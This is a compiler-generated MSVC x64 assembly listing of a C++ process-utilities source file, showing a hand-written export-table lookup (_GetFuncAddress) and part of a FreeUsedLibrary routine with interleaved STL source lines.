	mov	eax, DWORD PTR optHeader$[rsp+112]
	add	rax, rcx
	mov	r14d, DWORD PTR [rax+28]
	mov	ebp, DWORD PTR [rax+32]
	add	r14, rcx
	mov	r15d, DWORD PTR [rax+36]
	add	rbp, rcx
	mov	edi, DWORD PTR [rax+24]
	add	r15, rcx
	test	edi, edi
	je	SHORT $LN3@GetFuncAdd
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r11, QWORD PTR [rdx+24]
	npad	1
$LL4@GetFuncAdd:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 39   : 		const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];

	mov	eax, DWORD PTR [rbp+r9*4]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r8, rbx
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 39   : 		const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];

	add	rax, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r11, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN98@GetFuncAdd

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rbx]
$LN98@GetFuncAdd:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 40   : 		if ( strcmp(funcName, procedure.c_str()) == 0 ) {

	sub	r8, rax
	npad	9
$LL99@GetFuncAdd:
	movzx	edx, BYTE PTR [rax]
	movzx	ecx, BYTE PTR [rax+r8]
	sub	edx, ecx
	jne	SHORT $LN100@GetFuncAdd
	inc	rax
	test	ecx, ecx
	jne	SHORT $LL99@GetFuncAdd
$LN100@GetFuncAdd:
	test	edx, edx
	je	SHORT $LN93@GetFuncAdd

; 31   : 	PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
; 32   : 
; 33   : 	// Addresses
; 34   : 	DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
; 35   : 	DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
; 36   : 	WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );
; 37   : 
; 38   : 	for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {

	inc	r9d
	cmp	r9d, edi
	jb	SHORT $LL4@GetFuncAdd
$LN3@GetFuncAdd:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN72@GetFuncAdd
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN86@GetFuncAdd

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN83@GetFuncAdd

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN86@GetFuncAdd:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN72@GetFuncAdd:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 48   : 	return NULL;

	xor	eax, eax
$LN112@GetFuncAdd:

; 49   : }

	mov	BYTE PTR [rbx], 0
	lea	r11, QWORD PTR [rsp+272]
	mov	rbp, QWORD PTR [r11+48]
	mov	rsi, QWORD PTR [r11+56]
	mov	QWORD PTR [rbx+24], 15
	mov	QWORD PTR [rbx+16], 0
	mov	rbx, QWORD PTR [r11+32]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	rdi
	ret	0
$LN93@GetFuncAdd:

; 41   : 			DWORD funcID = funcNameOrdinals[funcIndex];
; 42   : 			DWORD address = functionAddresses[funcID];

	movzx	eax, WORD PTR [r15+r9*2]

; 43   : 			BYTE* absoluteAddress = ( ( BYTE* ) lib + address );

	mov	edi, DWORD PTR [r14+rax*4]
	add	rdi, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r11, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN34@GetFuncAdd
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r11+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN48@GetFuncAdd

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN83@GetFuncAdd

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN48@GetFuncAdd:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN34@GetFuncAdd:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 45   : 			return ( FARPROC ) absoluteAddress;

	mov	rax, rdi
	jmp	SHORT $LN112@GetFuncAdd
$LN83@GetFuncAdd:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN111@GetFuncAdd:
?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::_GetFuncAddress
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 32
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 104
$T7 = 136
$T8 = 168
$T9 = 168
$T10 = 168
lib$GSCopy$ = 200
__$ArrayPad$ = 208
lib$ = 272
?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::FreeUsedLibrary, COMDAT

; 86   : BOOL ProcessUtilities::FreeUsedLibrary(std::string lib) {

$LN829:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rsi
	mov	QWORD PTR [rsp+32], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	lea	rbp, QWORD PTR [rsp-55]
	sub	rsp, 224				; 000000e0H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-169], rax
	mov	rsi, rcx
	mov	QWORD PTR lib$GSCopy$[rbp-169], rcx

; 87   : 	if ( _loadedLibs.find(_lower(lib).c_str()) == _loadedLibs.end() )

	mov	rdx, rcx
	lea	rcx, QWORD PTR $T10[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN19@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN19@FreeUsedLi:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 87   : 	if ( _loadedLibs.find(_lower(lib).c_str()) == _loadedLibs.end() )

	mov	rdx, rax
	lea	rcx, QWORD PTR $T5[rbp-169]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	r8, QWORD PTR $T5[rbp-169]

; 2236 :         if (_Large_mode_engaged()) {

	mov	r14, QWORD PTR $T5[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR $T5[rbp-145]
	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	r8, r14
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	r12, -3750763034362895579		; cbf29ce484222325H
	mov	rcx, r12
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	mov	r9, 1099511628211			; 00000100000001b3H
	mov	rdi, QWORD PTR $T5[rbp-153]
	test	rdi, rdi
	je	SHORT $LN51@FreeUsedLi
	npad	1
$LL790@FreeUsedLi:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rdx]
	xor	rcx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rcx, r9

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	inc	rdx
	cmp	rdx, rdi
	jb	SHORT $LL790@FreeUsedLi
$LN51@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1564 :         const size_type _Bucket = _Hashval & _Mask;

	and	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48

; 1565 :         _Nodeptr _Where         = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;

	add	rcx, rcx
	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	rbx, QWORD PTR [rax+rcx*8+8]

; 1566 :         const _Nodeptr _End     = _List._Mypair._Myval2._Myhead;
; 1567 :         if (_Where == _End) {

	mov	r15, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1[rsp], r15
	cmp	rbx, r15
	je	SHORT $LN815@FreeUsedLi

; 1568 :             return {_End, _Nodeptr{}};
; 1569 :         }
; 1570 : 
; 1571 :         const _Nodeptr _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	mov	r15, QWORD PTR [rax+rcx*8]
	npad	1
$LL59@FreeUsedLi:

; 1572 :         for (;;) {
; 1573 :             // Search backwards to maintain sorted [_Bucket_lo, _Bucket_hi] when !_Standard
; 1574 :             if (!_Traitsobj(_Keyval, _Traits::_Kfn(_Where->_Myval))) {

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN79@FreeUsedLi

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN79@FreeUsedLi:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR $T5[rbp-169]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	cmova	rcx, r14

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	rdi, rax
	jne	SHORT $LN94@FreeUsedLi

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rdi
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN781@FreeUsedLi
$LN94@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1584 :             if (_Where == _Bucket_lo) {

	cmp	rbx, r15
	je	SHORT $LN782@FreeUsedLi

; 1586 :             }
; 1587 : 
; 1588 :             _Where = _Where->_Prev;

	mov	rbx, QWORD PTR [rbx+8]

; 1589 :         }

	jmp	SHORT $LL59@FreeUsedLi
$LN781@FreeUsedLi:

; 1575 :                 if constexpr (!_Traits::_Standard) {
; 1576 :                     if (_Traitsobj(_Traits::_Kfn(_Where->_Myval), _Keyval)) {
; 1577 :                         return {_Where->_Next, _Nodeptr{}};
; 1578 :                     }
; 1579 :                 }
; 1580 : 
; 1581 :                 return {_Where->_Next, _Where};

	mov	r15, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1[rsp]
	jmp	SHORT $LN60@FreeUsedLi
$LN782@FreeUsedLi:
	mov	r15, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1[rsp]
$LN815@FreeUsedLi:

; 1214 :             if (_Target) {

	xor	ebx, ebx
$LN60@FreeUsedLi:
	mov	rdi, r15
	test	rbx, rbx
	cmovne	rdi, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN147@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r13+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, r14

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN161@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r14, QWORD PTR [r14-8]
	sub	rax, r14

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN823@FreeUsedLi
$LN161@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, r14
	call	??3@YAXPEAX_K@Z				; operator delete
	npad	1
$LN147@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T4[rbp-145]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN185@FreeUsedLi

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T4[rsp]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN199@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN824@FreeUsedLi
$LN199@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN185@FreeUsedLi:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 87   : 	if ( _loadedLibs.find(_lower(lib).c_str()) == _loadedLibs.end() )

	cmp	rdi, r15
	jne	SHORT $LN2@FreeUsedLi
$LN821@FreeUsedLi:

; 98   : }

	mov	rdx, QWORD PTR [rsi+24]
	cmp	rdx, 15
	jbe	SHORT $LN222@FreeUsedLi
	inc	rdx
	cmp	rdx, 4096				; 00001000H
	mov	rcx, QWORD PTR [rsi]
	jb	SHORT $LN236@FreeUsedLi
	add	rdx, 39					; 00000027H
	mov	r8, QWORD PTR [rcx-8]
	sub	rcx, r8
	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN765@FreeUsedLi
	mov	rcx, r8
